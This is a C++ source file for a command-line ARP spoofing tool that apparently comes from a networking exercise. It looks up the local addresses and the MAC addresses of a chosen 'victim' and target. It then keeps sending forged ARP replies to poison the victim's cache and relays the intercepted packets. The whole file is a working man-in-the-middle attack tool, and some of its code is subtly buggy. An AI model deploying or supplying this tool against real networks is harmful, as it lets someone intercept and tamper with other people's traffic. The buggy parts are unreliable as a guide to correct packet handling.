#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <libnet.h>

//define address
char* myip;
char* mymac;
char* sip;
char* smac;
char* dip;
char* dmac;

#pragma pack(push, 1)

struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};

struct packet_hdr{
    struct libnet_ethernet_hdr eth;
    struct libnet_ipv4_hdr ip;
    struct libnet_tcp_hdr tcp;
    uint8_t* data;
};

#pragma pack(pop)

void usage() {
	printf("syntax: arp-spoof <interface> <sip> <dip>\n");
	printf("sample: arp-spoof enp0s5 192.168.0.1 192.168.0.4\n");
}

void find_my_ip(char* interface, char IP_str[20]){
	struct ifreq ifr;
	int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) printf("Error");
	else inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, IP_str,sizeof(struct sockaddr));  
}

void find_my_mac(char* interface, char MAC_str[20]){
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i<6; i++)
        sprintf(&MAC_str[i*3],"%02X:",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
	sprintf(&MAC_str[i*3],"%02X",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
    MAC_str[17]='\0';
}

void send_arp_request(char* interface, char* srcip, char* srcmac, char* dstip, char* dstmac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return;
	}
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(srcmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(srcmac);
	packet.arp_.sip_ = htonl(Ip(srcip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(dstip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	//capture dstmac
	struct pcap_pkthdr* header;
    const u_char* packet1;
	while(1){
		int r = pcap_next_ex(handle, &header, &packet1);
		struct EthArpPacket *pkt = (struct EthArpPacket*) packet1;
		if(ntohs( pkt->eth_.type_ == htons(EthHdr::Arp))){
			char tmpmac[20];
			strcpy(tmpmac, std::string(pkt->eth_.dmac_).c_str());
			if(memcmp(srcmac, tmpmac, sizeof(srcmac))==0) break;
		}
	}
	struct EthArpPacket *pkt = (struct EthArpPacket*) packet1;
	strcpy(dstmac, std::string(pkt->arp_.smac_).c_str());
	for(int i=0; i<17; i++)
		if( 96 < dstmac[i] && dstmac[i] < 103 ) dstmac[i] = dstmac[i] - 32;
	pcap_close(handle);
}

void arp_reply(char* interface, char* srcip, char* srcmac, char* dstip, char* dstmac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return;
	}

	EthArpPacket packet;
	packet.eth_.dmac_ = Mac(dstmac);
	packet.eth_.smac_ = Mac(srcmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(srcmac);
	packet.arp_.sip_ = htonl(Ip(srcip));
	packet.arp_.tmac_ = Mac(dstmac);
	packet.arp_.tip_ = htonl(Ip(dstip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
}

void arp_request(char* interface, char* srcip, char* srcmac, char* dstip, char* dstmac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return;
	}

	EthArpPacket packet;
	packet.eth_.dmac_ = Mac(dstmac);
	packet.eth_.smac_ = Mac(srcmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(srcmac);
	packet.arp_.sip_ = htonl(Ip(srcip));
	packet.arp_.tmac_ = Mac(dstmac);
	packet.arp_.tip_ = htonl(Ip(dstip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
}

void relay(char* interface, char* srcmac, char* attmac, char* dstmac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return;
	}
	while(true){
		struct pcap_pkthdr* header;
    	const u_char* packet1;
		int r = pcap_next_ex(handle, &header, &packet1);
		
		struct packet_hdr pk_hdr;
    	memcpy(&(pk_hdr.eth), packet1, LIBNET_ETH_H);
    	memcpy(&(pk_hdr.ip), packet1 + LIBNET_ETH_H, LIBNET_IPV4_H);
    	memcpy(&(pk_hdr.tcp), packet1 + LIBNET_ETH_H+LIBNET_IPV4_H, LIBNET_TCP_H);
		memcpy(&(pk_hdr.data), packet1 + LIBNET_ETH_H + LIBNET_IPV4_H + 4 * pk_hdr.tcp.th_off, header->caplen - (LIBNET_ETH_H + LIBNET_IPV4_H + 4 * pk_hdr.tcp.th_off));

		uint8_t tpsmac[6], tptmac[6], tpamac[6];
		memcpy(tpsmac, pk_hdr.eth.ether_shost, sizeof(tpsmac));
		memcpy(tpamac, pk_hdr.eth.ether_dhost, sizeof(tpamac));
		char smac1[20], dmac1[20];
		
		int i;
		for(i=0; i<5; i++){
			sprintf(&smac1[i*3], "%02X:", tpsmac[i]);
			sprintf(&dmac1[i*3], "%02X:", tpamac[i]);
		}
		sprintf(&smac1[i*3], "%02X", tpsmac[i]);
		sprintf(&dmac1[i*3], "%02X", tpamac[i]);
		for(i=0;i<6;i++){
			if(64 < dstmac[i*3]) tptmac[i] = (dstmac[i*3] - 55) * 16;
			else 				 tptmac[i] = (dstmac[i*3] - 48) * 16;

			if(64 < dstmac[i*3+1]) tptmac[i] += (dstmac[i*3+1] - 55);
			else 				   tptmac[i] += (dstmac[i*3+1] - 48);
		}
		if(memcmp(dstmac, dmac1, sizeof(attmac))==0) break; // arp table ended
		
		if( memcmp(srcmac, smac1, sizeof(srcmac))==0 && memcmp(attmac, dmac1, sizeof(attmac))==0 && ntohs(pk_hdr.eth.ether_type) == ETHERTYPE_IP){
			memcpy(pk_hdr.eth.ether_shost, tpamac, sizeof(tpamac));
			memcpy(pk_hdr.eth.ether_dhost, tptmac, sizeof(tptmac));
			int res = pcap_sendpacket(handle, (const u_char*)(&pk_hdr), sizeof(pk_hdr));
			if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			else puts("Reply Sending...");
		}
	}
	pcap_close(handle);
}

int main(int argc, char* argv[]) {
	if ( (argc%2) != 0 ) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char ipstr[20];
	char macstr[20];
	char macs[20];
	char macd1[20];
	char macd2[20];
	for(int i=2; i<argc; i += 2){
		memset(macs, 0, sizeof(macs));
		memset(macd1, 0, sizeof(macd1));
		memset(macd2, 0, sizeof(macd2));
		sip = argv[i];
		dip = argv[i+1];

		//find my ip address & mac address	
		find_my_ip(dev, ipstr);  
    	find_my_mac(dev, macstr);
		myip = ipstr;
    	mymac = macstr;

		//find victim's mac address
		strcpy(macs, mymac);
		send_arp_request(dev, myip, macs, sip, macd1);
		smac = macd1;
		send_arp_request(dev, myip, macs, dip, macd2);
		dmac = macd2;

		puts("\n***********************************");
		printf("Attacker\'s Ip : %s\nAttacker\'s Mac : %s\n", myip, mymac);
		puts("***********************************");
		printf("Sender\'s Ip : %s\nSender\'s Mac : %s\n", sip, smac);
		puts("***********************************");
		printf("Target\'s Ip : %s\nTarget\'s Mac : %s\n", dip, dmac);
		puts("***********************************\n");

		while (true){
			arp_reply(dev, dip, mymac, sip, smac);
			relay(dev, smac, mymac, dmac);
		}
	}
}
